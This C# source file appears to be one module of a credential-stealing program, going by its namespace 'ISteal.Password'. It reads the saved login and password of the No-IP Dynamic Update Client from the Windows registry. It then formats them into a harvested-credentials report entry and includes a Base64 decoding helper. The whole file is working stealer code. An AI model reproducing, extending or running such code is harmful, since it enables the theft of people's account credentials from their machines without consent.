using System;
using System.Collections.Generic;
using System.Text;
using Microsoft.Win32;

namespace ISteal.Password
{
    class NoIP
    {
        public static string Base64Decode(string data)
        {
            try
            {
                byte[] array = Convert.FromBase64String(data);
                char[] array2 = new char[checked(new UTF8Encoding().GetDecoder().GetCharCount(array, 0, array.Length) - 1 + 1)];
                new UTF8Encoding().GetDecoder().GetChars(array, 0, array.Length, array2, 0);
                return new string(array2);
            }
            catch { return null; }
        }

        public static List<PassDataNoIp> Initialise(string Path = @"HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC",string User = "Username", string Pass = "Password")
        {
            return new List<PassDataNoIp>
            {
                new PassDataNoIp(Registry.GetValue(Path, User, null).ToString(), Registry.GetValue(Path, Pass, null).ToString())
            };
        }
    }
   
    internal class PassDataNoIp
    {
        public string Login { get; private set; }
        public string Password { get; private set; }

        public PassDataNoIp(string login, string password)
        {
            Login = login;
            Password = password;
        }

        public override string ToString()
        {
            return string.Format("Program : {0}\r\n\r\nLogin : {1}\r\nPassword : {2}\r\n——————————————————————————————————",
            new object[]
            {
                "NoIp", Login, Password,
            });
        }
    }
}